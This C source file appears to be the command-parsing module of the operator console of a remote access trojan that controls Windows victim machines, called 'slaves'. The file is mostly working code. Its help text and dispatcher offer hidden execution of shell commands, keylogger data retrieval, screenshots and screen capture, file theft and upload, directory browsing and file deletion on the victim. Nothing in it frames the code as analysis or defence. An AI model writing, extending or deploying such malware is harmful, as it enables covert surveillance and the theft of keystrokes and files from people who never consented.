#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "types.h"
#include "logger.h"
#include "server.h"
#include "cmd/commands.h"
#include "net/interface.h"
#include "net/error.h"
#include "cmd/hdd/path.h"

int commands_cmdList_argsCount[COMMANDS_TOTAL_COMMANDS] = {  0,    1,       0,         0,         1,             1,                 0,                 0,             3,             2,           2,             3,        1,     0,    1,        1,         0};
char* commands_cmdList[COMMANDS_TOTAL_COMMANDS] =         { " ", "send ", "info", "terminate", "system ", "keylogger get ", "keylogger size", "keylogger clear", "screen get ", "file get ", "file send ", "screen cap ", "ls ", "ls", "cd ", "remove ", "disk list" };

void commands_printHelp(void)
{
	LOG(LOG_INFO, "Commands:\n");
	LOG(LOG_INFO, "  help                            #this\n");
	LOG(LOG_INFO, "  stop                            #stops the master\n");
	LOG(LOG_INFO, "  terminate                       #stops the slave\n");
	LOG(LOG_INFO, "  send {MSG}                      #sends echo\n");
	LOG(LOG_INFO, "  info                            #get slave computer information\n");
	LOG(LOG_INFO, "  system {CMD}                    #executes hidden CMD command\n");
	LOG(LOG_INFO, "  keylogger get {DEST}            #retrieves keylogger data\n");
	LOG(LOG_INFO, "  keylogger size                  #gets keylogger data size\n");
	LOG(LOG_INFO, "  keylogger clear                 #clears keylogger data\n");
	LOG(LOG_INFO, "  screen get {W%%}, {H%%}, {DEST}   #get screenshot with size abjusts\n");
	LOG(LOG_INFO, "  screen cap {W%%}, {H%%}, {MS}     #capture screen\n");
	LOG(LOG_INFO, "  file get {SRC}, {DEST}          #retrieves file, only filenames for slave\n");
	LOG(LOG_INFO, "  file send {DEST}, {SRC}         #sends file, only filenames for slave\n");
	LOG(LOG_INFO, "  ls                              #display list of files and folders\n");
	LOG(LOG_INFO, "  ls {PATH}                       #display list of files and folders\n");
	LOG(LOG_INFO, "  cd {PATH}                       #navigate to path\n");
	LOG(LOG_INFO, "  reset cd                        #resets path back to C:\\\n");
	LOG(LOG_INFO, "  remove {PATH}                   #deletes file\n");
	LOG(LOG_INFO, "  disk list                       #displays all mounted drives\n");
}

int commands_Equals(char* msg, int cmdId)
{
	int cmdLen = strlen(commands_cmdList[cmdId]);

	if(strlen(msg) < cmdLen)
	{
		return 0;
	}

	if(strncmp(msg, commands_cmdList[cmdId], cmdLen) == 0)
	{
		if(commands_cmdList_argsCount[cmdId] == 0)
		{
			return 1;
		}

		if(strlen(msg) > cmdLen) //ako ima argumenti
		{
			return 1;
		}

		return 0;
	}

	return 0;
}

//removes command and leaves only args
int commands_FormatCmd(OUT_STRP msg, int len, int cmdId)
{
	int cmdLen = strlen(commands_cmdList[cmdId]);

	if(len - cmdLen < 1)
	{
		return 0;
	}

	int nlen = len - cmdLen;

	char* nmsg = malloc(nlen + sizeof(char));
	strcpy(nmsg, *msg + cmdLen);
	*msg = nmsg;

	return 1;
}

int commands_ExportArg(OUT_STRP msg, OUT_STRP arg, int startIndex)
{
	int i;
	int cutIndex = 0;
	int retIndex = 0;
	char* tmsg = *msg;

	for(i = 0; i != strlen(tmsg); i++)
	{
		if(i >= startIndex)
		{
			if(tmsg[i] == COMMANDS_ARGS_SEP)
			{
				cutIndex = i;

				if(i + 2 < strlen(tmsg))
				{
					retIndex = i + 2;
				}

				break;
			}
		}
	}

	if(cutIndex < 1)
	{
		tmsg -= startIndex;
		*arg = NULL;

		return 0;
	}

	int len = cutIndex - startIndex;
	char* narg = malloc(len + sizeof(char));
	memset(narg, 0, len + sizeof(char));
	strncpy(narg, tmsg + startIndex, len);
	
	*arg = narg;

	return retIndex;
}

int commands_find(char* msg)
{
	msg[strlen(msg) - 1] = '\0'; //removes \n from input
	int msgLen = strlen(msg);

	if(strcmp(msg, "help") == 0)
	{
		commands_printHelp();

		return COMMANDS_DONT_SEEDUP;
	}else if(strcmp(msg, "stop") == 0){
		server_CloseConnection();

		return NET_LOST_CONNECTION;
	}else if(strcmp(msg, "reset cd") == 0){
		hdd_Path_Inited = 1;
		strcpy(hdd_Path, "C:\\");

		LOG(LOG_INFO, "Path is reseted to %s\n", hdd_Path);

		return COMMANDS_DONT_SEEDUP;
	}else if(commands_Equals(msg, COMMANDS_SEND)){
		if(!commands_FormatCmd(&msg, msgLen, COMMANDS_SEND))
		{
			return COMMANDS_UNKNOW_COMMAND;
		}

		return command_Send(msg, msgLen);
	}else if(commands_Equals(msg, COMMANDS_INFO)){
		return command_Info();
	}else if(commands_Equals(msg, COMMANDS_TERMINATE)){
		return command_Terminate();
	}else if(commands_Equals(msg, COMMANDS_SYSTEM)){
		if(!commands_FormatCmd(&msg, msgLen, COMMANDS_SYSTEM))
		{
			return COMMANDS_UNKNOW_COMMAND;
		}

		return command_System(msg, msgLen);
	}else if(commands_Equals(msg, COMMANDS_KEYLOGGER_GET)){
		if(!commands_FormatCmd(&msg, msgLen, COMMANDS_KEYLOGGER_GET))
		{
			return COMMANDS_UNKNOW_COMMAND;
		}
		
		return command_Keylogger_Get(msg, msgLen);
	}else if(commands_Equals(msg, COMMANDS_KEYLOGGER_SIZE)){
		return command_Keylogger_Size();
	}else if(commands_Equals(msg, COMMANDS_KEYLOGGER_CLEAR)){
		return command_Keylogger_Clear();
	}else if(commands_Equals(msg, COMMANDS_SCREEN_GET)){
		if(!commands_FormatCmd(&msg, msgLen, COMMANDS_SCREEN_GET))
		{
			return COMMANDS_UNKNOW_COMMAND;
		}

		return command_Screen_Get(msg, msgLen);
	}else if(commands_Equals(msg, COMMANDS_GET_FILE)){
		if(!commands_FormatCmd(&msg, msgLen, COMMANDS_GET_FILE))
		{
			return COMMANDS_UNKNOW_COMMAND;
		}

		return command_Get_File(msg, msgLen);
	}else if(commands_Equals(msg, COMMANDS_SEND_FILE)){
		if(!commands_FormatCmd(&msg, msgLen, COMMANDS_SEND_FILE))
		{
			return COMMANDS_UNKNOW_COMMAND;
		}

		return command_Send_File(msg, msgLen);
	}else if(commands_Equals(msg, COMMANDS_SCREEN_CAPTURE)){
		if(!commands_FormatCmd(&msg, msgLen, COMMANDS_SCREEN_CAPTURE))
		{
			return COMMANDS_UNKNOW_COMMAND;
		}

		return command_Screen_Capture(msg, msgLen);
	}else if(commands_Equals(msg, COMMANDS_HDD_LS_ARG)){
		if(!commands_FormatCmd(&msg, msgLen, COMMANDS_HDD_LS_ARG))
		{
			return COMMANDS_UNKNOW_COMMAND;
		}

		return command_hdd_Ls_Arg(msg, msgLen);
	}else if(commands_Equals(msg, COMMANDS_HDD_LS)){
		return command_hdd_Ls();
	}else if(commands_Equals(msg, COMMANDS_HDD_CD)){
		if(!commands_FormatCmd(&msg, msgLen, COMMANDS_HDD_CD))
		{
			return COMMANDS_UNKNOW_COMMAND;
		}

		return command_hdd_Cd(msg, msgLen);
	}else if(commands_Equals(msg, COMMANDS_REMOVE)){
		if(!commands_FormatCmd(&msg, msgLen, COMMANDS_REMOVE))
		{
			return COMMANDS_UNKNOW_COMMAND;
		}

		return command_Remove(msg, msgLen);
	}else if(commands_Equals(msg, COMMANDS_DISK_LIST)){
		return command_Disk_list();
	}

	return COMMANDS_UNKNOW_COMMAND;
}

int commands_Translate(char* msg)
{
	putchar('\n');

	int rv = commands_find(msg);

	if(rv == COMMANDS_UNKNOW_COMMAND)
	{
		LOG(LOG_ERR, "Unknow command!\n");
		LOG(LOG_INFO, "Type \"help\" for help!\n");
	}

	return rv;
}